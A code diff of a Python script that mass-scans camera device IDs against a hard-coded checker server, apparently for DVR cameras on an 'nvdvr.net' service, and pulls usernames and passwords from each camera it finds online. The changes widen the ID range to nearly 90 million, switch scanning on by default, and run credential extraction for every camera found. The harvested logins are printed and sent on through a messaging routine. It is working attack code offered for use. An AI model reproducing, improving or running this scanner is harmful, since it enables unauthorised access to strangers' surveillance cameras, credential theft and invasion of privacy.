@@ -11,12 +11,12 @@ import requests
 
 class server:
     # CHECKER CONFIG FOR SCANNING CAMS ONLINE IN RANGE
-    SCAN_NEW_CAMS = False
+    SCAN_NEW_CAMS = True
     FROM_ID = 10000000
-    TO_ID = 12000000
-    TIMEOUT = 30
-    PACK_LIST = 80000  # SIZE LIST ID CAMS FOR 1 THREAD SCAN
-    PACK_LIST_CAMS = 10000  # SIZE CAMS FOR 1 THREAD LISTEN
+    TO_ID = 99999999
+    TIMEOUT = 60
+    PACK_LIST_CAMS = 9999999  # SIZE CAMS FOR 1 THREAD LISTEN
+    THREAD_CHECK = 300
     SERVER_CHECKER = '47.74.66.18'
     PORT_CHECKER = 8900
     TMP_FILE = "tmp.txt"
@@ -28,8 +28,10 @@ class server:
     FileListCams = "cams.txt"
     PassFile = "pass.txt"
     CamsList = None
+    TMP = []
 
     def __init__(self):
+        self.current_id = self.FROM_ID
         self.check_s = None
         self.process = None
         self.send_msg(f"Start Script")
@@ -37,19 +39,20 @@ class server:
             if len(sys.argv) == 2:
                 if str(sys.argv[1]) == "scan":
                     self.SCAN_NEW_CAMS = True
-
-            if self.SCAN_NEW_CAMS:
-                self.GenerateListCams(f=self.FROM_ID, to=self.TO_ID)
             while True:
-                self.RemoveDuplicate()
-                self.CamList(self.FileListCams)
-                if not bool(self.CamsList):
-                    break
-                cams = list(self.func_chunk(self.CamsList, self.PACK_LIST_CAMS))
-
-                for cam in cams:
-                    self.Multiprocessing(cam)
-                    time.sleep(1)
+                if self.SCAN_NEW_CAMS:
+                    self.GenerateListCams(f=self.FROM_ID, to=self.TO_ID)
+                    print(self.current_id)
+                else:
+                    self.RemoveDuplicate()
+                    self.CamList(self.FileListCams)
+                # if not bool(self.CamsList):
+                #     break
+                # cams = list(self.func_chunk(self.CamsList, self.PACK_LIST_CAMS))
+                #
+                # for cam in cams:
+                #     self.Multiprocessing(cam)
+                #     time.sleep(1)
 
         except socket.error as e:
             print("socket creation failed with error %s\nuse Pt"
@@ -86,33 +89,41 @@ class server:
             start = stop
 
     def GenerateListCams(self, **k):
-        x = list(self.chunks([*range(k['f'], k['to'])], self.TO_ID // self.PACK_LIST))
 
+        x = list(range(self.current_id, self.current_id + self.PACK_LIST_CAMS))
+        self.current_id = x[-1:][0]
+        x = list(self.chunks(x, self.THREAD_CHECK))
         all_processes = []
         for i in x:
-            self.process = multiprocessing.Process(target=self.CheckerOnline, args=(i,))
-            all_processes.append(self.process)
-            self.process.start()
+            process = multiprocessing.Process(target=self.CheckerOnline, args=(i,))
+            all_processes.append(process)
+            process.start()
         for p in all_processes:
             p.join()
 
     def CheckerOnline(self, list_ids):
         for i in list_ids:
-            hexID = bytes(str(i), 'utf-8').hex()
-            data = 'ac000000f3030000'
-            data += hexID
-            data += '2e6e766476722e6e657400000000000000000000000000006022000093f5d10000000000000000000000000000000000'
-            data = bytes.fromhex(data)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.SERVER_CHECKER, self.PORT_CHECKER))
-            sock.send(data)
-            response = sock.recv(4096)
-            sock.close()
-            if response[4] == 1:
-                print(f'\u001b[32m[+] Camera with device ID: {i} is online!\u001b[37m')
-                # Append-adds at last
-                with open(self.FileListCams, "a") as f:
-                    f.write(f"{i}\n")
+            if i:
+                # print(f'\u001b[35m[+] Check ID: {i}\u001b[37m')
+                hexID = bytes(str(i), 'utf-8').hex()
+                data = 'ac000000f3030000'
+                data += hexID
+                data += '2e6e766476722e6e657400000000000000000000000000006022000093f5d10000000000000000000000000000000000'
+                data = bytes.fromhex(data)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((self.SERVER_CHECKER, self.PORT_CHECKER))
+                sock.send(data)
+                response = sock.recv(4096)
+                sock.close()
+                if response[4] == 1:
+                    print(f'\u001b[32m[+] Camera with device ID: {i} is online!\u001b[37m')
+                    # Append-adds at last
+                    with open(self.FileListCams, "a") as f:
+                        f.write(f"{i}\n")
+
+                    process = multiprocessing.Process(target=self.CreateSocket, args=(i,))
+                    process.start()
+                    process.join()
 
     def RemoveDuplicate(self):
         lines_present = set()
@@ -143,7 +154,7 @@ class server:
                 # split out the username and password from the result
                 username = result[8:result.find(b'\x00', 8)].decode('utf-8')
                 password = result[0x3a:result.find(b'\x00', 0x3a)].decode('utf-8')
-                print(f'\u001b[32m[+] DeviceID: {d["id"]}')
+                print(f'\u001b[31m[+] DeviceID: {d["id"]}')
                 print(f'[+] Username: {username}')
                 print(f'[+] Password: {password}\u001b[37m')
                 self.send_msg(f'[+] DeviceID:{d["id"]}'
